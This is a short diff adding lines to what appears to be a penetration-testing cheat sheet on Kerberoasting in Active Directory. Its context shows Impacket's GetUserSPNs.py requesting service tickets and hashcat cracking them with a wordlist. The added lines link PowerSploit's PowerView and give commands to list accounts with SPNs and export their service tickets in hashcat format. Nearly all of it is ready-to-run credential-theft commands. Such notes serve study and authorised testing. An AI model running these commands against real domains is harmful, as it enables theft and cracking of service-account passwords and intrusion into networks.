@@ -132,4 +132,9 @@ GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request-user <any-user
 hashcat -m 13100 <text-file-name> /usr/share/wordlists/rockyou.txt 
 ```
 
-
+Powerview to extract TGS Tickets - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+```
+Import-module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname //list all users with SPN
+Get-DomainUser -Identity <user-from-list> | Get-DomainSPNTicket -Format Hashcat
+```
